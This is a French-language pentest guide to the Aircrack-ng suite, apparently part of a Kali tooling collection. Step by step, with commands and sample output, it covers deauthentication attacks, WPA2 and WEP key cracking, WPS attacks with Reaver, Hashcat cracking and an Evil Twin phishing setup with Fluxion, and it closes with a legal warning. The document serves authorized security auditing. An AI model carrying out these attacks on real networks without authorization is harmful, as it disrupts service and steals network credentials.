# 📡 Aircrack-ng - WiFi Security Auditing Suite

## Description

Aircrack-ng est une suite complète pour auditer la sécurité des réseaux Wi-Fi :
- **airmon-ng** : Activer mode monitor
- **airodump-ng** : Capturer paquets Wi-Fi
- **aireplay-ng** : Injecter paquets (deauth, fake auth, etc.)
- **aircrack-ng** : Cracker clés WEP/WPA/WPA2
- **airdecap-ng** : Déchiffrer captures
- **airbase-ng** : Créer AP malveillant (Evil Twin)

**Supporte :** WEP, WPA, WPA2-PSK, WPA3 (limité)

---

## Installation

✅ **Déjà installé dans Kali Headless**

```bash
# Vérifier l'installation
airmon-ng --version
```

---

## ⚠️ IMPORTANT : Interface réseau requise

**Aircrack-ng nécessite une carte WiFi en mode monitor.**

**Dans Docker Kali :**
- Les containers Docker n'ont **PAS** accès direct au Wi-Fi
- Vous devez utiliser une **clé USB Wi-Fi** compatible mode monitor
- Puis la passer au container via `--device`

**Cartes USB recommandées :**
- Alfa AWUS036NHA (Atheros AR9271)
- TP-Link TL-WN722N v1 (Atheros AR9271)
- Alfa AWUS036ACH (Realtek RTL8812AU)

---

## Workflow standard

```
1. airmon-ng start wlan0        → Mode monitor
2. airodump-ng wlan0mon         → Scanner réseaux
3. airodump-ng -c 6 --bssid XX  → Capturer handshake
4. aireplay-ng -0 10 -a XX      → Deauth (forcer handshake)
5. aircrack-ng -w wordlist.txt  → Cracker handshake
```

---

## Exemples pratiques

### Exemple 1 : Mettre l'interface en mode monitor

```bash
# 1. Vérifier les interfaces Wi-Fi
iwconfig

# 2. Tuer les processus interférents
airmon-ng check kill

# 3. Activer mode monitor
airmon-ng start wlan0

# Interface devient : wlan0mon (ou wlan0)

# 4. Vérifier mode monitor actif
iwconfig wlan0mon
# Mode:Monitor
```

---

### Exemple 2 : Scanner les réseaux Wi-Fi

```bash
# Scanner tous les réseaux
airodump-ng wlan0mon

# Résultat :
# CH  6 ][ Elapsed: 12 s ]
#
# BSSID              PWR  Beacons  Data  CH  MB   ENC  CIPHER AUTH ESSID
# 00:11:22:33:44:55  -45       10     0   6  54e  WPA2 CCMP   PSK  HomeNetwork
# AA:BB:CC:DD:EE:FF  -60       15     5  11  54e. WPA2 CCMP   PSK  OfficeWiFi

# Colonnes :
# - BSSID      : MAC address du point d'accès
# - PWR        : Signal strength (-30 = fort, -90 = faible)
# - Beacons    : Paquets beacon capturés
# - Data       : Paquets de données
# - CH         : Canal (1-14)
# - ENC        : Encryption (WEP, WPA, WPA2, WPA3)
# - ESSID      : Nom du réseau
```

---

### Exemple 3 : Capturer handshake WPA/WPA2

```bash
# 1. Cibler un réseau spécifique
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
# -c 6                      : Canal 6
# --bssid XX:XX:XX:XX:XX:XX : MAC du point d'accès
# -w capture                : Nom du fichier de capture

# 2. Attendre qu'un client se connecte (handshake)
# Ou forcer une reconnexion (étape suivante)

# Résultat attendu dans le terminal :
# [ WPA handshake: 00:11:22:33:44:55 ]

# Fichiers créés :
# - capture-01.cap   (capture principale)
# - capture-01.csv   (données CSV)
```

---

### Exemple 4 : Forcer un handshake (deauth attack)

```bash
# Ouvrir un 2ème terminal

# Envoyer 10 paquets deauth au point d'accès
aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon
# -0 10   : Deauth attack (10 paquets)
# -a XX   : BSSID du point d'accès

# Ou cibler un client spécifique
aireplay-ng -0 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
# -c XX   : MAC address du client

# Résultat :
# Les clients se déconnectent → reconnectent → handshake capturé
```

---

### Exemple 5 : Cracker le handshake WPA2

```bash
# Cracker avec wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Avec BSSID spécifique (si plusieurs dans la capture)
aircrack-ng -w rockyou.txt -b 00:11:22:33:44:55 capture-01.cap

# Avec plusieurs CPU cores
aircrack-ng -w rockyou.txt -p 8 capture-01.cap
# -p 8 : 8 CPU cores

# Résultat si succès :
# KEY FOUND! [ Password123! ]
```

---

### Exemple 6 : Cracker WEP (ancien protocole)

```bash
# 1. Capturer paquets (besoin de beaucoup d'IVs)
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wep_capture wlan0mon

# 2. Accélérer la capture (injection ARP)
aireplay-ng -3 -b 00:11:22:33:44:55 wlan0mon
# -3 : ARP request replay attack

# 3. Cracker quand suffisamment d'IVs (>50k pour 64-bit, >200k pour 128-bit)
aircrack-ng wep_capture-01.cap

# Résultat :
# KEY FOUND! [ 12:34:56:78:90 ]
```

---

### Exemple 7 : Evil Twin (Fake AP)

```bash
# 1. Créer un point d'accès fake
airbase-ng -e "FreeWiFi" -c 6 wlan0mon
# -e : ESSID (nom du réseau)
# -c : Canal

# 2. Les clients se connectent → capturer credentials
# (Nécessite page de phishing + serveur DHCP/DNS)

# Setup complet avec Fluxion (automatisé) :
# git clone https://github.com/FluxionNetwork/fluxion.git
# cd fluxion
# ./fluxion.sh
```

---

## Outils complémentaires

### Reaver (WPS PIN attack)

```bash
# Installer
apt install reaver

# Attaque WPS (si activé sur le routeur)
reaver -i wlan0mon -b 00:11:22:33:44:55 -vv
# Peut prendre 2-10 heures
```

### Wifite (automatisation)

```bash
# Scanner + cracker automatique
wifite

# Options :
# - Détecte réseaux
# - Capture handshakes
# - Cracker avec wordlist
# - Support WEP/WPA/WPA2/WPS
```

### Hashcat (cracker GPU)

```bash
# Convertir .cap en .hccapx (format Hashcat)
cap2hccapx capture-01.cap capture.hccapx

# Cracker avec GPU (beaucoup plus rapide)
hashcat -m 2500 capture.hccapx rockyou.txt
# -m 2500 : WPA/WPA2

# Ou nouveau format .22000 (hashcat 6.0+)
hcxpcapngtool -o hash.22000 capture-01.cap
hashcat -m 22000 hash.22000 rockyou.txt
```

---

## Commandes utiles

```bash
# Arrêter mode monitor
airmon-ng stop wlan0mon

# Changer canal Wi-Fi
iwconfig wlan0mon channel 11

# Afficher statistiques de capture
airodump-ng --update 1 wlan0mon
# --update 1 : rafraîchir chaque seconde

# Filtrer uniquement WPA2
airodump-ng --encrypt WPA2 wlan0mon

# Capturer uniquement les clients d'un AP
airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX --station wlan0mon

# Vérifier si handshake dans capture
aircrack-ng capture-01.cap
# Affiche : "1 handshake" ou "0 handshake"
```

---

## Cas d'usage réels

### Scénario 1 : Audit de sécurité WiFi domestique

**Contexte :** Tester la force du mot de passe WiFi de votre maison.

```bash
# 1. Mode monitor
airmon-ng check kill
airmon-ng start wlan0

# 2. Scanner
airodump-ng wlan0mon
# Noter BSSID + Canal de votre réseau

# 3. Capturer handshake
airodump-ng -c 6 --bssid YOUR_BSSID -w home_test wlan0mon

# 4. (Autre terminal) Forcer reconnexion
aireplay-ng -0 5 -a YOUR_BSSID wlan0mon

# 5. Cracker
aircrack-ng -w /usr/share/wordlists/rockyou.txt home_test-01.cap

# 6. Si trouvé rapidement → mot de passe faible → changer!
```

---

### Scénario 2 : Pentest entreprise

**Contexte :** Red Team autorisé à tester la sécurité WiFi.

```bash
# 1. Scanner tous les réseaux de l'entreprise
airodump-ng -w corp_survey wlan0mon

# 2. Identifier cibles WPA2-PSK
# (Ignorer WPA2-Enterprise = radius)

# 3. Capturer handshakes de tous les APs
# (Automatiser avec script)

# 4. Cracker offline avec wordlist + règles
aircrack-ng -w corporate_passwords.txt captures/*.cap

# 5. Rapport : "X% des APs vulnérables à dictionnaire"
```

---

### Scénario 3 : Evil Twin pour phishing WiFi

**Contexte :** Démonstration de sensibilisation (avec autorisation).

```bash
# Utiliser Fluxion (automatise Evil Twin + phishing)
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion
./fluxion.sh

# Workflow Fluxion :
# 1. Scanner réseaux
# 2. Sélectionner cible
# 3. Capturer handshake
# 4. Créer AP clone
# 5. Deauth clients
# 6. Page de phishing demande mot de passe
# 7. Valider mot de passe capturé
```

---

## Optimisation

### Wordlists spécialisées WiFi

```bash
# Wordlist mots de passe WiFi français
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt

# Générer wordlist custom (Crunch)
crunch 8 12 0123456789 -o wifi_pins.txt
# Pins numériques 8-12 caractères
```

### Règles Hashcat

```bash
# Générer variations de mots de passe
hashcat -m 22000 hash.22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## Ressources

- [Aircrack-ng Documentation](https://www.aircrack-ng.org/)
- [Wireless Pentesting Cheatsheet](https://github.com/adon90/pentest_compilation)
- [Fluxion](https://github.com/FluxionNetwork/fluxion)
- [Wifite](https://github.com/derv82/wifite2)

---

## ⚠️ AVERTISSEMENT LÉGAL CRITIQUE

**L'utilisation d'Aircrack-ng est ILLÉGALE sans autorisation explicite.**

**LÉGAL :**
- ✅ Votre propre réseau WiFi
- ✅ Pentest avec contrat signé
- ✅ Lab/environnement de test isolé

**ILLÉGAL :**
- ❌ Réseaux WiFi de voisins
- ❌ Réseaux publics (cafés, hôtels, etc.)
- ❌ Réseaux d'entreprises sans permission

**CONSÉQUENCES :**
- 🚔 Délit pénal (Computer Fraud and Abuse Act aux US, Loi Godfrain en France)
- 💰 Amendes importantes (jusqu'à 375k€ en France)
- ⛓️ Prison (jusqu'à 5 ans)
- 📝 Casier judiciaire

**DÉONTOLOGIE :**
- Toujours obtenir autorisation ÉCRITE
- Pentests WiFi = contrat signé obligatoire
- Utiliser uniquement sur vos équipements

**RÈGLE D'OR :** Si ce n'est pas votre réseau, NE PAS utiliser Aircrack-ng.
